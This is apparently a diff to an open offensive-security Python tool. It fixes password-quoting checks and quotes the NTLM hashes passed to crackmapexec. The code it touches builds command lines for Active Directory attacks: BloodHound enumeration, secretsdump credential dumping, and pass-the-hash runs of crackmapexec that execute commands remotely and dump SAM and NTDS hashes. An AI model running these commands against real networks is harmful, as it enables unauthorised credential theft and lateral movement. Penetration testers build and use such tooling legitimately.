@@ -1347,7 +1347,7 @@ while True:
          USR = BAK         
       if USR.find("'") != -1:
          print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))
-      if USR[:2] == '""':
+      if USR[:2] == "''":
          USR = "''"
       if USR.find("\"") != -1:
          print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
@@ -1377,7 +1377,7 @@ while True:
          PAS = BAK         
       if PAS.find("'") != -1:
          print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))         
-      if PAS[:2] == '""':
+      if PAS[:2] == "''":
          PAS = "''"         
       if PAS.find("\"") != -1:
          print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
@@ -2674,7 +2674,7 @@ while True:
          checkParams = test_DOM()                     
       if checkParams != 1:
          print ("[*] Enumerating, please wait...\n")                       
-         if PAS[:2] != '""':
+         if PAS[:2] != "''":
             remotCOM("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
          else:
             print("[i] Using HASH value as password credential...")
@@ -2719,7 +2719,7 @@ while True:
          checkParams = test_DOM()               
       if checkParams != 1:
          print(colored("[*] Enumerating, please wait...", colour3))         
-         if PAS[:2] != '""':
+         if PAS[:2] != "''":
             remotCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
          else:
             print("[i] Using HASH value as password credential...")
@@ -2775,7 +2775,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()               
       if checkParams != 1:      
-         if PAS[:2] != '""':
+         if PAS[:2] != "''":
             checkParams = test_PRT("5985")                                    
             if checkParams != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
@@ -2794,7 +2794,6 @@ while True:
                remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
                remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
-               exit(1) # Crackmap issue!!
          else:
             print("[i] Using HASH value as password credential...")
             checkParams = test_PRT("5985")
@@ -2804,19 +2803,18 @@ while True:
             checkParams = test_PRT("445")
             if checkParams != 1:
                print("\n[+] Checking priviliges...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X whoami /priv")
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
                print("\n[+] Enumerating users...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")               
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")               
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions")               
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
                print("\n[+] Enumerating SAM...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam")               
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
-               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")
-               exit(1) # Crackmap issue!!
-      prompt()	# EOF Error hence exit(1)
+               remotCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
+      prompt()	# EOF Error here for some reason?
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
